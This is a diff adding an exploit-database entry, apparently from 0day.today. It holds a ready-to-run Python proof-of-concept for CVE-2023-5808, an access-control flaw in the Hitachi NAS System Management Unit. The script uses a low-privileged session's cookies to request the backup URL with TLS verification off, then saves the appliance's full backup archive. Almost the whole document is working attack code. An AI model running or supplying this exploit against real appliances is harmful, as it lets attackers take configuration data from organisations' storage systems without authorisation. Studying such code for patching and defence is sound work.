@@ -1,0 +1,95 @@
+id: 39435
+date: 03/11/2024
+title: Hitachi NAS (HNAS) System Management Unit (SMU) Backup & Restore < 14.8.7825.01 IDOR Exploit
+author: Arslan Masood
+cves: CVE-2023-5808
+
+#!/usr/bin/python3
+#
+# Title:            Hitachi NAS (HNAS) System Management Unit (SMU) Backup & Restore IDOR Vulnerability 
+# CVE:              CVE-2023-5808
+# Date:             2023-12-13
+# Exploit Author:   Arslan Masood (@arszilla)
+# Vendor:           https://www.hitachivantara.com/
+# Version:          < 14.8.7825.01
+# Tested On:        13.9.7021.04        
+
+import argparse
+from datetime import datetime
+from os import getcwd
+
+import requests
+
+parser = argparse.ArgumentParser(
+    description="CVE-2023-5808 PoC",
+    usage="./CVE-2023-5808.py --host <Hostname/FQDN/IP> --id <JSESSIONID> --sso <JSESSIONIDSSO>"
+    )
+
+# Create --host argument:
+parser.add_argument(
+    "--host",
+    required=True,
+    type=str,
+    help="Hostname/FQDN/IP Address. Provide the port, if necessary, i.e. 127.0.0.1:8443, example.com:8443"
+    )
+
+# Create --id argument:
+parser.add_argument(
+    "--id",
+    required=True,
+    type=str,
+    help="JSESSIONID cookie value"
+    )
+
+# Create --sso argument:
+parser.add_argument(
+    "--sso",
+    required=True,
+    type=str,
+    help="JSESSIONIDSSO cookie value"
+    )
+
+args = parser.parse_args()
+
+def download_file(hostname, jsessionid, jsessionidsso):
+    # Set the filename:
+    filename = f"smu_backup-{datetime.now().strftime('%Y-%m-%d_%H%M')}.zip"
+
+    # Vulnerable SMU URL:
+    smu_url = f"https://{hostname}/mgr/app/template/simple%2CBackupSmuScreen.vm/password/"
+
+    # GET request cookies
+    smu_cookies = {
+        "JSESSIONID":       jsessionid,
+        "JSESSIONIDSSO":    jsessionidsso
+        }
+
+    # GET request headers:
+    smu_headers = {
+        "User-Agent":                   "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Accept":                       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language":              "en-US,en;q=0.5",
+        "Accept-Encoding":              "gzip, deflate",
+        "Dnt":                          "1",
+        "Referer":                      f"https://{hostname}/mgr/app/action/admin.SmuBackupRestoreAction/eventsubmit_doperform/ignored",
+        "Upgrade-Insecure-Requests":    "1",
+        "Sec-Fetch-Dest":               "document",
+        "Sec-Fetch-Mode":               "navigate",
+        "Sec-Fetch-Site":               "same-origin",
+        "Sec-Fetch-User":               "?1",
+        "Te":                           "trailers",
+        "Connection":                   "close"
+        }
+
+    # Send the request:
+    with requests.get(smu_url, headers=smu_headers, cookies=smu_cookies, stream=True, verify=False) as file_download:
+        with open(filename, 'wb') as backup_archive:
+            # Write the zip file to the CWD:
+            backup_archive.write(file_download.content)
+
+    print(f"{filename} has been downloaded to {getcwd()}")
+
+if __name__ == "__main__":
+    download_file(args.host, args.id, args.sso)
+
+#  0day.today [2024-03-15]  #
